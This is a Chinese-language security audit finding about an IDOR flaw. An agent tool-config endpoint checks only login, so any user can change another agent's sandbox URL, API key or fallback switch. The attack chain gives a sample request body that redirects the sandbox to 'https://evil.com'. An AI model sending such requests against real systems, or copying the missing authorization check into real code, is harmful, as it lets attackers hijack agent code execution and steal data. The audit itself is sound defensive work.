# 工具/沙箱配置更新存在 IDOR

> 分类：安全（SEC）  
> 证据等级：F（源码直接证明）  
> 分析基线：`4f843556`

---

## 一句话

`update_agent_tool_config` 端点（`tools.py:794-826`）仅验证用户已登录，不验证用户是否为 Agent 的创建者或租户成员。任何登录用户可修改任意 Agent 的沙箱类型、URL、API Key 和回退开关。

---

## 1. 漏洞端点

`backend/app/api/tools.py:794-826`：

```python
@router.put("/agents/{agent_id}/tools/config")
async def update_agent_tool_config(
    agent_id: uuid.UUID,
    config: ToolConfigUpdate,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
```

依赖项只有 `get_current_user`——验证用户已登录。没有：

- 验证用户是否为 Agent 的 `creator_id`
- 验证用户是否与 Agent 同属一个 `tenant_id`
- 验证用户是否具有 `agent_admin` 或更高角色

---

## 2. 自由格式配置

`config: ToolConfigUpdate` 包含一个自由格式字典 `config: dict`，可以控制：

- 沙箱类型（本地 / Docker / 远程）
- 沙箱 URL 和 API Key
- MCP 服务器配置
- 回退开关

攻击者可以：
- 将沙箱指向自己的恶意服务器
- 替换 API Key，使 Agent 的沙箱调用失败或泄露数据
- 关闭沙箱，使 Agent 直接在宿主机执行代码

---

## 3. 对比：`update_agent_tools` 有部分检查

同一文件中的 `update_agent_tools`（`tools.py:452`）有部分权限检查——验证了用户是否为 Agent 的创建者。但 `update_agent_tool_config` 没有相同的检查。

---

## 4. 攻击链

```
攻击者（已登录的普通用户）
  → PUT /api/v1/agents/{任意 agent_id}/tools/config
  → Body: {"config": {"sandbox_type": "remote", "sandbox_url": "https://evil.com", "sandbox_api_key": "attacker_key"}}
  → Agent 下次执行代码时，在攻击者控制的沙箱中运行
  → 攻击者窃取 Agent 的代码执行结果和上下文
```

---

## 5. 与 AI Coding 的关系

1. 同一文件中两个端点（`update_agent_tools` 和 `update_agent_tool_config`）的权限检查不一致——暗示由不同的 prompt/任务生成
2. `get_current_user` 是最简单的"让代码能跑"的依赖注入——AI 倾向于使用已有的、最简单的依赖，而非思考"这个端点需要什么级别的权限"